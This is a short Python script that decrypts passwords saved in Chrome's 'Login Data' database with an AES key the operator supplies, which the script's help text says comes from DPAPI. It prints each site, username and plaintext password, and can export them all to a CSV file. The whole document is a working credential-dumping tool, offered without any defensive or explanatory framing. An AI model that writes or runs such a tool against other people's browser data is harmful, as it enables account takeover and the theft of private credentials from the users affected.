#!/usr/bin/env python3
import sqlite3, argparse, sys
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def decrypt_password(blob, key):
    if blob[:3] in (b'v10', b'v11'):
        nonce = blob[3:15]
        ciphertext = blob[15:-16]
        tag = blob[-16:]
    else:
        return "[Unknown format]"
    try:
        return AESGCM(key).decrypt(nonce, ciphertext + tag, None).decode()
    except:
        return "[Decryption error]"

def main():
    parser = argparse.ArgumentParser(description='Decrypt Chrome passwords using an AES key.')
    parser.add_argument('login_data', help='Path to Login Data file')
    parser.add_argument('key', help='64‑char hex AES key (from DPAPI unprotect)')
    parser.add_argument('--output', '-o', help='Output file (CSV)')
    args = parser.parse_args()

    key = bytes.fromhex(args.key)
    conn = sqlite3.connect(args.login_data)
    cur = conn.cursor()
    cur.execute("SELECT origin_url, username_value, password_value FROM logins")

    rows = []
    for url, user, pwd in cur.fetchall():
        pw = decrypt_password(pwd, key)
        rows.append((url, user, pw))
        print(f"[*] {url} | {user} : {pw}")

    conn.close()

    if args.output:
        with open(args.output, 'w') as f:
            for r in rows:
                f.write(f'"{r[0]}","{r[1]}","{r[2]}"\n')
        print(f"[+] Saved to {args.output}")

if __name__ == "__main__":
    main()
